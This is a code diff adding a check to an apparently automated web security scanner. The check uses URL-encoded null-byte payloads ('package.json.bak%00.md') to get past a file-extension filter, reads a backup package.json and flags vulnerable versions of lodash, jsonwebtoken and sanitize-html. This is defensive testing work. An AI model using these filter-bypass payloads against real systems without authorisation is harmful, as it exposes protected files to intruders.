@@ -438,7 +438,49 @@ Write to shared_context:
             except Exception as e:
                 self.log("warning", f"test_npm_vulnerabilities failed: {e}")
 
+        # WSTG-CONF-01: Vulnerable npm packages via /ftp/package.json.bak null byte bypass
+        await self._check_ftp_packages(target)
+
         self.log("info", "Configuration & Deployment checks complete")
+
+    async def _check_ftp_packages(self, target: str) -> None:
+        import httpx as _httpx, json as _json
+
+        VULN_PACKAGES = {
+            "sanitize-html": ("1.", "XSS bypass via sanitize-html < 2.x - CVE-2021-26540"),
+            "jsonwebtoken": ("8.", "algorithm confusion in jsonwebtoken < 9.x"),
+            "lodash": ("4.17.1", "prototype pollution in lodash - CVE-2019-10744"),
+        }
+
+        base = target.rstrip("/")
+        bypasses = [
+            f"{base}/ftp/package.json.bak%00.md",
+            f"{base}/ftp/package.json.bak%2500.md",
+        ]
+
+        async with _httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as c:
+            for url in bypasses:
+                try:
+                    r = await c.get(url)
+                    if r.status_code == 200 and len(r.content) > 5000:
+                        deps = _json.loads(r.text).get("dependencies", {})
+                        for pkg, (vuln_prefix, cve_note) in VULN_PACKAGES.items():
+                            ver = deps.get(pkg, "")
+                            if ver and ver.lstrip("^~>=").startswith(vuln_prefix):
+                                self.add_finding(
+                                    "WSTG-CONF-01",
+                                    f"Vulnerable npm package exposed: {pkg}@{ver}",
+                                    severity="high",
+                                    evidence={
+                                        "package": pkg,
+                                        "version": ver,
+                                        "source": "/ftp/package.json.bak (null byte bypass)",
+                                        "note": cve_note,
+                                    },
+                                )
+                        return
+                except Exception:
+                    continue
 
     def _get_target(self) -> str | None:
         from ..core.db import get_db
